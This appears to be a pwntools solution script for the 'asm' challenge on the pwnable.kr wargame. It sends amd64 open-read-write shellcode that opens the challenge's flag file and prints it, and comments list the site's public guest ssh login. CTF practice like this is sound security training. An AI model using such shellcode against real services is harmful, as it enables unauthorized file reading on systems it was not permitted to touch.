from pwn import *


# con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
# p = con.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')
p = remote('pwnable.kr', 9026)
shellcode = ''
# push the file name onto the stack 
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

# open file and using rax to return file handle 
shellcode += shellcraft.open('rsp', 0, 0)
# read the opened file onto stack 
shellcode += shellcraft.read('rax', 'rsp', 100)
# write it on standard output 
shellcode += shellcraft.write(1, 'rsp', 100)
# log.info(shellcode)
p.recvuntil('shellcode: ')
print(shellcode)
p.send(asm(shellcode))
print(p.recvline())
